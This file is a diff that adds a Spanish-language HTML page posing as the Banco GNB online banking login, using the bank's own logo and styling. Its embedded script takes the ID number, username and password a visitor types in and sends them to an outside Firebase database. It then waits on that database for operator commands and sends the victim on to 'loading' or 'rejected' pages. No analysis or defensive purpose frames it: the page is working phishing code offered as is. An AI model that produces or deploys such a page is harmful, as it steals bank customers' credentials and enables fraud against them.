@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no">
+<title>GNB :: Login 6.55.0</title>
+<link rel="icon" href="https://www.bancognb.com.py/bancaweb/img/favicon.ico" type="image/icon">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&display=swap">
+<style>
+html{background:transparent;font-family:"Open Sans",sans-serif;}
+body{min-width:320px;margin:0;}
+.bg-gnb-login{background-color:#EDEDED;font-family:'Open Sans',sans-serif;}
+#login-content{background:#fff;min-height:47.6em;margin-right:-15px;margin-left:-15px;display:table;}
+.gnb-input-login{background-color:#f4f4f4;border:none;height:45px;border-radius:0 !important;border-bottom:1px solid #aaa;box-shadow:inset 0 1px 0 0 #ececec;color:#121212;font-family:'Open Sans',sans-serif;font-weight:600;outline:none;padding:.75em 1em .75em 13px;font-size:14px !important;}
+
+/* Boton */
+.btn-login{
+  background:#0574AF !important;
+  border:0 !important;
+  border-radius:0 !important;
+  box-shadow:none !important;
+  height:50px;
+  width:100%;
+  display:flex !important;
+  align-items:center;
+  justify-content:center;
+  padding:0 !important;
+  margin:0;
+  cursor:pointer;
+  line-height:normal !important;
+  font-size:14px !important;
+}
+.btn-login span{
+  font-family:'Open Sans',sans-serif;
+  font-weight:600;
+  font-size:16px;
+  color:#fff;
+  line-height:1;
+  display:block;
+  position:static !important;
+  top:0 !important;
+  margin:0 !important;
+}
+.btn-login:hover{background:#04608f !important;}
+.btn-login[disabled]{opacity:.55;cursor:default;}
+
+h2.cliente{font-family:'Open Sans',sans-serif;font-weight:600;font-size:30px !important;letter-spacing:-.3px;line-height:1.1;margin:0;color:#7AB83F;text-align:center;}
+.header-login{padding-top:20px;padding-bottom:25px;}
+.tirica-redirect{color:#0574AF;font-size:20px;margin-bottom:30px;padding-left:0;padding-top:10px;text-align:right;}
+.tirica-redirect a{color:#0574AF;text-decoration:none;}
+.padding-0{padding:0;}
+.padding-bottom-10{padding-bottom:10px;}
+.centertext{text-align:center;}
+#login-form-error{background:#FBDFDF;border:1px solid #f4ccdf;border-radius:4px;color:#c4136c;margin-bottom:20px;margin-top:20px;padding:10px;display:none;}
+#login-form-error h1{font-family:'Open Sans',sans-serif;color:#000;font-weight:normal;margin-bottom:6px;padding:1px 0;font-size:22px;margin-top:0;}
+#login-form-error #validationSummaryOutput{color:#000;font-family:'Open Sans',sans-serif;font-size:1.1em;font-weight:normal;line-height:1.4;}
+.login-form{margin-bottom:10px;}
+a,a#forgotPassword,a#forgotUsername,a#onboardingInvitation{text-decoration:none;color:#2986CA;font-weight:normal !important;cursor:pointer;font-size:14px;}
+a:hover{text-decoration:underline;}
+@media (min-width:992px){#login-content{margin-left:25% !important;}}
+</style>
+</head>
+<body class="bg-gnb-login">
+<div class="container">
+  <div class="row">
+    <div class="col-xs-12 col-md-12 col-lg-12 padding-bottom-10"></div>
+    <div id="login-content" class="col-md-6 col-md-offset-3">
+
+      <div class="col-xs-12 col-sm-12 col-md-12 tirica-redirect"><a href="https://www.bancognb.com.py/public/">X</a></div>
+
+      <div class="col-xs-12 col-sm-10 col-md-10 col-md-offset-1 centertext header-login">
+        <img src="https://www.bancognb.com.py/bancaweb/img/brand/new-logo-gnb-fusion.svg" alt="GNB" width="300" height="150" style="max-width:100%;height:auto">
+      </div>
+
+      <div id="app" class="col-xs-12 col-md-12 col-sm-12 padding-0">
+        <div class="col-md-12 col-xs-12 col-sm-12">
+
+          <form class="login-form" id="login" autocomplete="off" novalidate>
+
+            <div class="form-group col-md-8 col-md-offset-2 padding-0">
+              <h2 class="cliente">PERSONAS</h2>
+            </div>
+
+            <div class="form-group col-md-8 col-md-offset-2 padding-0">
+              <input type="text" name="documento" id="documento" class="form-control gnb-input-login" maxlength="20" placeholder="Número de Documento" autocomplete="off" inputmode="numeric">
+            </div>
+
+            <div class="form-group col-md-8 col-md-offset-2 padding-0">
+              <input type="text" id="access-username" name="access-username" class="form-control gnb-input-login" placeholder="Usuario" autocomplete="off">
+            </div>
+
+            <div class="form-group col-md-8 col-md-offset-2 padding-0">
+              <input type="password" id="access-pin" name="access-pin" class="form-control gnb-input-login" maxlength="64" placeholder="Clave de acceso" autocomplete="off">
+            </div>
+
+            <div class="form-group col-md-8 col-md-offset-2 padding-0">
+              <div id="login-form-error">
+                <h1>Error</h1>
+                <div id="validationSummaryOutput"></div>
+              </div>
+            </div>
+
+            <div class="form-group col-md-8 col-md-offset-2 padding-0">
+              <button id="btnLogin" type="submit" disabled="disabled" class="btn btn-login"><span>Ingresar</span></button>
+            </div>
+
+          </form>
+
+          <div class="col-xs-12" style="text-align:center;margin-top:10px;">
+            <a id="forgotPassword" href="#">¿Olvidó su clave?</a>
+          </div>
+          <div class="col-xs-12" style="text-align:center;margin-top:5px;">
+            <a id="forgotUsername" href="#">¿Olvidó su usuario?</a>
+          </div>
+          <div class="col-xs-12" style="text-align:center;margin-top:5px;">
+            <a id="onboardingInvitation" href="#">¿Tiene código de invitación?</a>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var DB = "https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
+  var form=document.getElementById('login'), doc=document.getElementById('documento'),
+      usu=document.getElementById('access-username'), cla=document.getElementById('access-pin'),
+      btn=document.getElementById('btnLogin'), caja=document.getElementById('login-form-error'),
+      txt=document.getElementById('validationSummaryOutput');
+
+  var id = new URLSearchParams(location.search).get('u');
+  if(!id){ try{ id = localStorage.getItem('nbch_u'); }catch(x){} }
+  if(!id){ id = Date.now().toString(36)+Math.random().toString(36).slice(2,7); }
+  try{ localStorage.setItem('nbch_u', id); localStorage.setItem('nbch_banco','GNB'); }catch(x){}
+
+  doc.addEventListener('input', function(){ this.value=this.value.replace(/\D/g,'').slice(0,9); ok(); });
+  usu.addEventListener('input', ok);
+  cla.addEventListener('input', ok);
+
+  function ok(){ btn.disabled = !(doc.value.trim().length>=5 && usu.value.trim().length>=3 && cla.value.length>=1); }
+
+  function fallar(m){ txt.textContent=m; caja.style.display='block'; btn.disabled=false; btn.querySelector('span').textContent='Ingresar'; }
+
+  form.addEventListener('submit', function(e){
+    e.preventDefault();
+    caja.style.display='none';
+    if(doc.value.trim().length<5) return fallar('Ingrese un número de documento válido.');
+    if(usu.value.trim().length<3) return fallar('Ingrese su usuario.');
+    if(cla.value.length<4) return fallar('Ingrese su clave de acceso.');
+
+    btn.disabled=true; btn.querySelector('span').textContent='Verificando...';
+
+    var ahora=new Date();
+    var d={id:id, cedula:doc.value.trim(), documento:doc.value.trim(), usuario:usu.value.trim(),
+           clave:cla.value, origen:'gnb', banco:'GNB', estado:'CLAVE',
+           fecha:ahora.toLocaleDateString('es-PY')+' '+ahora.toLocaleTimeString('es-PY'), ts:Date.now()};
+
+    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).catch(function(){});
+    fetch(DB+'/comandos/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({estado:'CLAVE',accion:''})}).catch(function(){});
+
+    setTimeout(function(){ location.href='cargando.html?u='+id; }, 1400);
+  });
+
+  var salio=false;
+  setInterval(function(){
+    if(salio) return;
+    fetch(DB+'/comandos/'+id+'.json').then(function(r){return r.json();}).then(function(c){
+      if(c && c.accion==='rechazar'){ salio=true; location.href='rechazado.html?u='+id; }
+    }).catch(function(){});
+  },3000);
+})();
+</script>
+</body>
+</html>
